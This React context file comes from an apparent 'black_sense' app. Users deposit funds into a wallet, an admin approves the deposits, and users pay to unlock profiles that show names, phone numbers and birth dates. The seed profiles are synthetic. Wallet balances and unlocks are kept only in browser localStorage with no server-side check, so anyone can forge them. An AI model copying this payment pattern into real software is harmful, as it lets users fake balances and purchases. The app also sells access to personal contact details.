import React, { createContext, useContext, useState, useEffect } from 'react';
import { Profile, Deposit, Transaction } from '../types';
import { UNLOCK_PRICES, US_CITIES, US_STATES, OCCUPATIONS } from '../lib/constants';

interface ProfileContextType {
  profiles: Profile[];
  deposits: Deposit[];
  transactions: Transaction[];
  addDeposit: (deposit: Omit<Deposit, 'id' | 'status' | 'createdAt'>) => void;
  approveDeposit: (id: string) => void;
  rejectDeposit: (id: string) => void;
  unlockProfile: (profileId: string) => Promise<void>;
  updateProfile: (profile: Profile) => void;
  deleteProfile: (id: string) => void;
  addProfile: (profile: Omit<Profile, 'id'>) => void;
}

const ProfileContext = createContext<ProfileContextType | undefined>(undefined);

const INITIAL_IMAGES = [
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-1-59976ec1-1779496141990.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-2-0870ff4e-1779496142842.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-3-93cfb1cc-1779496142706.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-4-104a0083-1779496141856.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-5-5bd57740-1779496142374.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-6-240d5d0f-1779496142575.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-7-35c14f11-1779496142242.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-8-c8b43ac9-1779496142121.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-9-8b3ef664-1779496143087.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-10-f3a07e1c-1779496143212.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-11-9d818ec0-1779496142960.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-12-a2250b36-1779496143590.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-13-714e332e-1779496143367.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-14-d4ba3042-1779496143531.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-15-3dff7d7a-1779496143685.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-16-25e5b2f2-1779496143736.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-17-ec9b1cc9-1779496144732.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-18-fd829c50-1779496144490.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-19-30b17168-1779496144748.webp",
  "https://storage.googleapis.com/dala-prod-public-storage/generated-images/4a72d82d-9aaa-4b59-8ec2-bdcdd1f18c82/profile-20-ba048437-1779496144817.webp"
];

const NAMES = [
  "Michael Thompson", "Sarah Jenkins", "David Rodriguez", "Emily Chen", "Robert Wilson",
  "Jessica Taylor", "James Anderson", "Linda Martinez", "Christopher Lee", "Patricia White",
  "Daniel Harris", "Jennifer Clark", "Matthew Lewis", "Elizabeth Young", "Joseph Walker",
  "Mary Hall", "Anthony Allen", "Barbara King", "Andrew Wright", "Donna Scott"
];

export const ProfileProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [profiles, setProfiles] = useState<Profile[]>(() => {
    const saved = localStorage.getItem('black_sense_profiles');
    if (saved) return JSON.parse(saved);

    // Initial 20 profiles
    return Array.from({ length: 20 }, (_, i) => ({
      id: `p-${i + 1}`,
      fullName: NAMES[i],
      city: US_CITIES[i % US_CITIES.length],
      state: US_STATES[i % US_STATES.length],
      phoneNumber: `+1 (${Math.floor(200 + Math.random() * 700)}) ${Math.floor(100 + Math.random() * 899)}-${Math.floor(1000 + Math.random() * 8999)}`,
      occupation: OCCUPATIONS[i % OCCUPATIONS.length],
      dob: `${1970 + Math.floor(Math.random() * 30)}-${Math.floor(1 + Math.random() * 12).toString().padStart(2, '0')}-${Math.floor(1 + Math.random() * 28).toString().padStart(2, '0')}`,
      bio: `Highly experienced ${OCCUPATIONS[i % OCCUPATIONS.length]} with a track record of success in ${US_CITIES[i % US_CITIES.length]}. Seeking new premium connections.`,
      notes: "Available for premium consulting and high-level networking.",
      imageUrl: INITIAL_IMAGES[i],
      status: i % 3 === 0 ? 'Verified' : i % 3 === 1 ? 'Premium' : 'Active',
      price: UNLOCK_PRICES[Math.floor(Math.random() * UNLOCK_PRICES.length)]
    }));
  });

  const [deposits, setDeposits] = useState<Deposit[]>(() => {
    const saved = localStorage.getItem('black_sense_deposits');
    return saved ? JSON.parse(saved) : [];
  });

  const [transactions, setTransactions] = useState<Transaction[]>(() => {
    const saved = localStorage.getItem('black_sense_transactions');
    return saved ? JSON.parse(saved) : [];
  });

  useEffect(() => {
    localStorage.setItem('black_sense_profiles', JSON.stringify(profiles));
  }, [profiles]);

  useEffect(() => {
    localStorage.setItem('black_sense_deposits', JSON.stringify(deposits));
  }, [deposits]);

  useEffect(() => {
    localStorage.setItem('black_sense_transactions', JSON.stringify(transactions));
  }, [transactions]);

  const addDeposit = (deposit: Omit<Deposit, 'id' | 'status' | 'createdAt'>) => {
    const newDeposit: Deposit = {
      ...deposit,
      id: Math.random().toString(36).substr(2, 9),
      status: 'pending',
      createdAt: new Date().toISOString()
    };
    setDeposits(prev => [newDeposit, ...prev]);
  };

  const approveDeposit = (id: string) => {
    const deposit = deposits.find(d => d.id === id);
    if (!deposit) return;

    setDeposits(prev => prev.map(d => d.id === id ? { ...d, status: 'approved' } : d));

    // Update user balance
    const allUsers = JSON.parse(localStorage.getItem('black_sense_users') || '[]');
    const updatedUsers = allUsers.map((u: any) => {
      if (u.id === deposit.userId) {
        return { ...u, balance: (u.balance || 0) + deposit.amount };
      }
      return u;
    });
    localStorage.setItem('black_sense_users', JSON.stringify(updatedUsers));

    // Update current user if matches
    const currentUser = JSON.parse(localStorage.getItem('black_sense_user') || 'null');
    if (currentUser && currentUser.id === deposit.userId) {
      currentUser.balance = (currentUser.balance || 0) + deposit.amount;
      localStorage.setItem('black_sense_user', JSON.stringify(currentUser));
      window.dispatchEvent(new Event('storage')); // Force reload if needed
    }

    setTransactions(prev => [{
      id: Math.random().toString(36).substr(2, 9),
      userId: deposit.userId,
      type: 'deposit',
      amount: deposit.amount,
      description: `Deposit Approved - Ref: ${deposit.transactionRef}`,
      createdAt: new Date().toISOString()
    }, ...prev]);
  };

  const rejectDeposit = (id: string) => {
    setDeposits(prev => prev.map(d => d.id === id ? { ...d, status: 'rejected' } : d));
  };

  const unlockProfile = async (profileId: string) => {
    const profile = profiles.find(p => p.id === profileId);
    const currentUser = JSON.parse(localStorage.getItem('black_sense_user') || 'null');
    
    if (!profile || !currentUser) throw new Error('Action not authorized');
    if (currentUser.balance < profile.price) throw new Error('Insufficient wallet balance');

    // Deduct balance and add to unlocked
    currentUser.balance -= profile.price;
    currentUser.unlockedProfiles = [...(currentUser.unlockedProfiles || []), profileId];
    
    localStorage.setItem('black_sense_user', JSON.stringify(currentUser));
    
    // Update users list
    const allUsers = JSON.parse(localStorage.getItem('black_sense_users') || '[]');
    const updatedUsers = allUsers.map((u: any) => u.id === currentUser.id ? currentUser : u);
    localStorage.setItem('black_sense_users', JSON.stringify(updatedUsers));

    setTransactions(prev => [{
      id: Math.random().toString(36).substr(2, 9),
      userId: currentUser.id,
      type: 'unlock',
      amount: profile.price,
      description: `Unlocked Profile: ${profile.fullName}`,
      createdAt: new Date().toISOString()
    }, ...prev]);

    window.dispatchEvent(new Event('storage'));
  };

  const updateProfile = (profile: Profile) => {
    setProfiles(prev => prev.map(p => p.id === profile.id ? profile : p));
  };

  const deleteProfile = (id: string) => {
    setProfiles(prev => prev.filter(p => p.id !== id));
  };

  const addProfile = (profile: Omit<Profile, 'id'>) => {
    setProfiles(prev => [{ ...profile, id: `p-${Date.now()}` }, ...prev]);
  };

  return (
    <ProfileContext.Provider value={{ 
      profiles, 
      deposits, 
      transactions, 
      addDeposit, 
      approveDeposit, 
      rejectDeposit, 
      unlockProfile,
      updateProfile,
      deleteProfile,
      addProfile
    }}>
      {children}
    </ProfileContext.Provider>
  );
};

export const useProfiles = () => {
  const context = useContext(ProfileContext);
  if (!context) throw new Error('useProfiles must be used within ProfileProvider');
  return context;
};